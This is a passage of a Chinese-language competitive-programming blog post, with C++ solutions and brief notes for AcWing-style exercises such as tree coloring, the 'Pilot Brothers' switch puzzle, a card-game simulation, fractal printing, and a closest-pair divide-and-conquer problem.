class="hljs-type">int</span>&gt;(b.<span class="hljs-built_in">rbegin</span>(), b.<span class="hljs-built_in">rend</span>())) <span class="hljs-keyword">return</span> a;<br><span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> a, b;<br>cin &gt;&gt; a &gt;&gt; b;<br>p[i] = <span class="hljs-built_in">make_pair</span>(a * b, a);<br>&#125;<br><span class="hljs-built_in">sort</span>(p, p + n);<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">product</span><span class="hljs-params">(<span class="hljs-number">1</span>,x)</span></span>;  <span class="hljs-comment">//初始为x</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)</span></span>;      <span class="hljs-comment">//初始为0</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> lr = p[i].first;<br><span class="hljs-type">int</span> l = p[i].second;<br>res = <span class="hljs-built_in">max_vec</span>(res, <span class="hljs-built_in">div</span>(product, lr / l));<br>product = <span class="hljs-built_in">mul</span>(product, l);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = res.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) cout &lt;&lt; res[i];<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="给树染色">给树染色</h4><p>权值合并-&gt;等效权值</p><p>参考：https://www.acwing.com/solution/content/1065/</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1010</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br><span class="hljs-type">int</span> father, size, sum;<br><span class="hljs-type">double</span> avg;   <span class="hljs-comment">//合并后的等效权值</span><br>&#125;nodes[N];<br><span class="hljs-type">int</span> n, root;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">()</span>       <span class="hljs-comment">//找当前权值最多的点的下标</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">double</span> avg = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> res = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != root &amp;&amp; nodes[i].avg &gt; avg)<br>&#123;<br>avg = nodes[i].avg;<br>res = i;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; root;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)   <span class="hljs-comment">//节点编号对应</span><br>&#123;<br>cin &gt;&gt; nodes[i].sum;<br>nodes[i].size = <span class="hljs-number">1</span>;<br>nodes[i].avg = nodes[i].sum;<br>ans += nodes[i].sum;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> a, b;<br>cin &gt;&gt; a &gt;&gt; b;<br>nodes[b].father = a;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n<span class="hljs-number">-1</span>; i++)  <span class="hljs-comment">//循环n-2次进行合并,最后根节点不合并（组合并公式）</span><br>&#123;<br><span class="hljs-type">int</span> mmax = <span class="hljs-built_in">find</span>();<br><span class="hljs-type">int</span> f = nodes[mmax].father;<br>ans += nodes[mmax].sum * nodes[f].size;<br><span class="hljs-comment">//合并</span><br>nodes[f].sum += nodes[mmax].sum;<br>nodes[f].size += nodes[mmax].size;<br>nodes[f].avg = (<span class="hljs-type">double</span>)nodes[f].sum / nodes[f].size;<br><span class="hljs-comment">//去除</span><br>nodes[mmax].avg = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//处理合并的节点的子节点</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (nodes[i].father == mmax)<br>&#123;<br>nodes[i].father = f;<br>&#125;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="练习">练习</h3><h4 id="飞行员兄弟">飞行员兄弟</h4><p>暴力枚举，总共有2^16（65536）种状态。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> ba[N][N];<br><span class="hljs-type">int</span> g[N][N];<br>vector&lt;PII&gt; ways;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">turn</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++)<br>&#123;<br>ba[x][i] = (ba[x][i] + <span class="hljs-number">1</span>) % mod;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != x)<br>&#123;<br>ba[i][y] = (ba[i][y] + <span class="hljs-number">1</span>) % mod;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">4</span>; j++)<br>&#123;<br><span class="hljs-type">char</span> x;<br>cin &gt;&gt; x;<br><span class="hljs-keyword">if</span> (x == <span class="hljs-string">&#x27;+&#x27;</span>) ba[i][j] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span> ba[i][j] = <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">1e10</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>; i++)<br>&#123;<br><span class="hljs-built_in">memcpy</span>(g, ba, <span class="hljs-keyword">sizeof</span> ba);<br><span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++)<br>&#123;<br><span class="hljs-keyword">if</span> (i &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-type">int</span> x = k / <span class="hljs-number">4</span>;<br><span class="hljs-type">int</span> y = k % <span class="hljs-number">4</span>;<br><span class="hljs-built_in">turn</span>(x + <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>);<br>step++;<br>&#125;<br>&#125;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">4</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (ba[i][j] == <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br><span class="hljs-keyword">if</span> (ans &gt; step)<br>&#123;<br>ans = step;<br>ways.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++)<br>&#123;<br><span class="hljs-keyword">if</span> (i &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>&#123;<br>ways.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">make_pair</span>(k / <span class="hljs-number">4</span> + <span class="hljs-number">1</span>, k % <span class="hljs-number">4</span> + <span class="hljs-number">1</span>));<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-built_in">memcpy</span>(ba, g, <span class="hljs-keyword">sizeof</span> ba);<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> way :ways)<br>&#123;<br><span class="hljs-type">int</span> x = way.first;<br><span class="hljs-type">int</span> y = way.second;<br>cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="占卜diy">占卜DIY</h4><p>vector的一些用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; a;<br>##翻转<br><span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>());<br>##头尾两个数<br>a.<span class="hljs-built_in">front</span>()/a.<span class="hljs-built_in">back</span>();<br>##去除头尾元素<br>头： a.<span class="hljs-built_in">erase</span>(a.<span class="hljs-built_in">begin</span>());<br>尾： a.<span class="hljs-built_in">pop_back</span>();<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">bool</span>&gt; PII;<br>vector&lt;PII&gt; heaps[<span class="hljs-number">14</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">13</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>&#123;<br><span class="hljs-type">char</span> a;<br>cin &gt;&gt; a;<br><span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; a &lt;= <span class="hljs-string">&#x27;9&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (a == <span class="hljs-string">&#x27;0&#x27;</span>)<br>&#123;<br>heaps[i].<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">10</span>, <span class="hljs-literal">false</span>&#125;);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>heaps[i].<span class="hljs-built_in">push_back</span>(&#123;a - <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-literal">false</span>&#125;);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (a == <span class="hljs-string">&#x27;A&#x27;</span>)heaps[i].<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">1</span>, <span class="hljs-literal">false</span>&#125;);<br><span class="hljs-keyword">if</span> (a == <span class="hljs-string">&#x27;J&#x27;</span>)heaps[i].<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">11</span>, <span class="hljs-literal">false</span>&#125;);<br><span class="hljs-keyword">if</span> (a == <span class="hljs-string">&#x27;Q&#x27;</span>)heaps[i].<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">12</span>, <span class="hljs-literal">false</span>&#125;);<br><span class="hljs-keyword">if</span> (a == <span class="hljs-string">&#x27;K&#x27;</span>)heaps[i].<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">13</span>, <span class="hljs-literal">false</span>&#125;);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">13</span>; i++)<br>&#123;<br><span class="hljs-built_in">reverse</span>(heaps[i].<span class="hljs-built_in">begin</span>(), heaps[i].<span class="hljs-built_in">end</span>());<br>&#125;<br><span class="hljs-keyword">while</span> (heaps[<span class="hljs-number">13</span>].<span class="hljs-built_in">size</span>())<br>&#123;<br>PII top = heaps[<span class="hljs-number">13</span>].<span class="hljs-built_in">back</span>();<br>top.second = <span class="hljs-literal">true</span>;<br>heaps[<span class="hljs-number">13</span>].<span class="hljs-built_in">pop_back</span>();<br><span class="hljs-keyword">while</span> (top.first != <span class="hljs-number">13</span>)<br>&#123;<br><span class="hljs-type">int</span> x = top.first;<br>top.second = <span class="hljs-literal">true</span>;<br>heaps[x].<span class="hljs-built_in">push_back</span>(top);<br>top = heaps[x].<span class="hljs-built_in">front</span>();<br>heaps[x].<span class="hljs-built_in">erase</span>(heaps[x].<span class="hljs-built_in">begin</span>());<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">12</span>; i++)<br>&#123;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br><span class="hljs-type">int</span> len = heaps[i].<span class="hljs-built_in">size</span>();<br><span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; len; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (heaps[i][j].first == i &amp;&amp; heaps[i][j].second)<br>sum++;<br>&#125;<br><span class="hljs-keyword">if</span> (sum == <span class="hljs-number">4</span>)<br>ans++;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分形">分形</h4><figure><img src="/2024/12/03/algorithm-enhance/1733232345800.png" alt="1733232345800"><figcaption aria-hidden="true">1733232345800</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> g[<span class="hljs-number">1010</span>][<span class="hljs-number">1010</span>];<br><span class="hljs-type">int</span> sx[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span> &#125;;   <span class="hljs-comment">//确定各个起点</span><br><span class="hljs-type">int</span> sy[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">df</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>)<br>&#123;<br>g[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">df</span>(n - <span class="hljs-number">1</span>);<br><br><span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">2</span>; i++)len *= <span class="hljs-number">3</span>;    <span class="hljs-comment">//利用上一级进行复制</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; len; j++)<br>&#123;<br>g[sx[k] * len + i][sy[k] * len + j] = g[i][j];<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">df</span>(<span class="hljs-number">7</span>);<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n &amp;&amp; n != <span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i++) len *= <span class="hljs-number">3</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; len; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (g[i][j]) cout &lt;&lt; <span class="hljs-string">&#x27;X&#x27;</span>;<br><span class="hljs-keyword">else</span> cout &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&#x27;-&#x27;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="袭击">袭击</h4><p>最近点对变形（所有的点均属于同一阵营）</p><p>分治：将点按x排序后，对半分，分别算出两边内部点的最小值ans，再计算两边点的最小值（根据ans缩小比较区域）</p><p>具体划分参考：</p><p>https://www.acwing.com/solution/content/15774/</p><p>此题将点分为两种阵营，在计算距离是加一步判断即可</p><p>此外，还有存在极端情况，排序后两个阵营的点分别在两端，可能会使时间复杂度为O(n^2)，听说可以采用旋转坐标轴的方式改进</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span 